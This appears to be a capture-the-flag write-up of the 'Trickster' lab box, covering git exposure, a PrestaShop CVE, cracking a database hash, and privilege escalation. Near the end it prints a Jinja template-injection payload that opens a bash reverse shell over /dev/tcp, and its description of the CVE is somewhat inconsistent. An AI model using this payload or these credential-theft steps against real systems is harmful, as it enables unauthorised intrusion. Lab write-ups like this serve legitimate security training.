---
layout: writeup
title: "Trickster"
date: 2026-06-16
description: "Exploiting a PrestaShop file-manager flaw (CVE-2024-34716), then a PrusaSlicer template injection inside a container, to reach root."
tags: [Box, medium, linux]
---

## Reconnaissance

The engagement began with a full TCP port scan to identify exposed services on the target host.

```bash
nmap -sVC -p- --open -sS --min-rate 5000 -v -n -Pn -oN trickster_scan <IP_target>
```

The scan reveals two open ports: 22 running SSH and 80 serving HTTP. Enumerating the web service uncovers a virtual host configured as [http://shop.trickster.htb/](http://shop.trickster.htb/).

Navigating to this subdomain exposes a login panel on the application.

![Navigating to this subdomain, identifying a login panel exposed on the application](/assets/images/trickster/131-1.png)
*Navigating to this subdomain, identifying a login panel exposed on the application*

Running **whatweb** gathers more information about the web stack and confirms the server is running Apache **2.4.52**.

The application allows user registration, which provides a foothold for further interaction with the platform.

![The application allows user registration, which provides a foothold for further interaction with the platform](/assets/images/trickster/131-2.png)
*The application allows user registration, which provides a foothold for further interaction with the platform*

## Enumeration / Analysis

Exploring the application directories reveals that the **.git** directory is publicly accessible at [http://shop.trickster.htb/.git/](http://shop.trickster.htb/.git/).

Inspecting the Git configuration files identifies a user named **admin**.

![Inspecting the Git configuration files, identifying a user named admin](/assets/images/trickster/131-3.png)
*Inspecting the Git configuration files, identifying a user named admin*

Reviewing the Git logs reveals that an administrative panel was committed by the admin user. The commit message and hash provide valuable insight into recent changes.

```bash
0000000000000000000000000000000000000000 0cbc7831c1104f1fb0948ba46f75f1666e18e64c adam <adam@trickster.htb> 1716538399 -0400 commit (initial): update admin pannel
```

GitDumper is used to extract the repository contents and analyze the commit **0cbc7831c1104f1fb0948ba46f75f1666e18e64c**. The code suggests a file-upload vulnerability.

Selecting a product and intercepting the request in Burp Suite exposes the application cookies, confirming backend behavior tied to the shop functionality.

![Application cookies observed while intercepting a product request](/assets/images/trickster/131-4.png)
*Application cookies observed while intercepting a product request*

The application clearly references **Prestashop**. Further directory enumeration leads to an exposed administrative path at [http://shop.trickster.htb/admin634ewutrx1jgitlooaj](http://shop.trickster.htb/admin634ewutrx1jgitlooaj).

This endpoint redirects to a Prestashop administrator login panel, confirming the version in use as **Prestashop 8.1.5**.

![The Prestashop 8.1.5 administrator login panel](/assets/images/trickster/131-5.png)
*The Prestashop 8.1.5 administrator login panel*

Although the **robots.txt** file is accessible, it discloses nothing useful. A file-manager endpoint is found at **admin634ewutrx1jgitlooaj/filemanager/force_download.ph**.

Further testing reveals a reflected XSS vulnerability, tracked as **CVE-2024-34716**.

![Further testing reveals a reflected XSS vulnerability, tracked as CVE-2024-34716](/assets/images/trickster/131-6.png)
*Further testing reveals a reflected XSS vulnerability, tracked as CVE-2024-34716*

## Exploitation

Leveraging this vulnerability yields a reverse shell on the target. Once inside, the Prestashop configuration file at **/var/www/prestashop/app/config/parameters.php** is located, containing database credentials.

```bash
mysql -h 127.0.0.1 -u ps_user -p prestashop
```

```bash
prest@shop_o
```

```bash
select * from ps_employee;
```

Querying the database reveals credentials for the user **james**, including a bcrypt password hash.

```bash
james --> $2a$04$rgBYAsSHUVK3RZKfwbYY9OPJyBbt/OzGw9UHi4UnlK6yG5LyunCmm
```

The hash is cracked with John the Ripper and the rockyou wordlist.

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

![Cracking the hash using John the Ripper and the rockyou wordlist](/assets/images/trickster/131-7.png)
*Cracking the hash using John the Ripper and the rockyou wordlist*

With valid credentials in hand, SSH access as the james user is obtained.

![With valid credentials obtained, authenticating via SSH as the james user](/assets/images/trickster/131-8.png)
*With valid credentials obtained, authenticating via SSH as the james user*

Enumerating the system reveals the presence of two additional user accounts.

![Enumerating the system reveals the presence of two additional user accounts](/assets/images/trickster/131-9.png)
*Enumerating the system reveals the presence of two additional user accounts*

## Privilege Escalation

To continue enumeration, **linpeas.sh** is uploaded to the target and given execute permissions.

LinPEAS highlights a Python script running under the **runner** user.

```bash
runner 1243 0.0 0.6 33660 24520 ? Ss Sep23 0:16 /usr/bin/python3 /home/runner/prestashop/AutoVisitAttach.py
```

Several active ports point to services related to PrusaSlicer.

![Active ports pointing to PrusaSlicer-related services](/assets/images/trickster/131-10.png)
*Active ports pointing to PrusaSlicer-related services*

![Active ports pointing to PrusaSlicer-related services](/assets/images/trickster/131-11.png)
*Active ports pointing to PrusaSlicer-related services*

Research suggests PrusaSlicer 2.6.1 may be vulnerable to arbitrary code execution via file upload. A Docker container is also present.

![Research suggests that PrusaSlicer 2.6.1 may be vulnerable to arbitrary code execution via file upload](/assets/images/trickster/131-12.png)
*Research suggests that PrusaSlicer 2.6.1 may be vulnerable to arbitrary code execution via file upload*

SSH port forwarding is set up to reach the service running inside the container.

```bash
ssh -L 5000:172.17.0.2:5000 james@trickster.htb
```

The exposed service is vulnerable to a blind Server-Side Template Injection that allows remote code execution. The following payload spawns a reverse shell.

```bash
{% for x in ().__class__.__base__.__subclasses__() %}
{% if "warning" in x.__name__ %}
{{ x()._module.__builtins__['__import__']('os').popen("/bin/bash -c '/bin/bash -i >& /dev/tcp/<IP>/9999 0>&1'").read() }}
{% endif %}
{% endfor %}
```

This grants the operator a shell as root inside the container.

![This grants the operator a shell as root inside the container](/assets/images/trickster/131-13.png)
*This grants the operator a shell as root inside the container*

Inspecting the bash history reveals a plaintext password.

![Inspecting the bash history reveals a plaintext password](/assets/images/trickster/131-14.png)
*Inspecting the bash history reveals a plaintext password*

Reusing these credentials authenticates as root on the host, completing the privilege escalation.

![Reusing these credentials to authenticate as root on the host system, completing the privilege escalation](/assets/images/trickster/131-15.png)
*Reusing these credentials to authenticate as root on the host system, completing the privilege escalation*
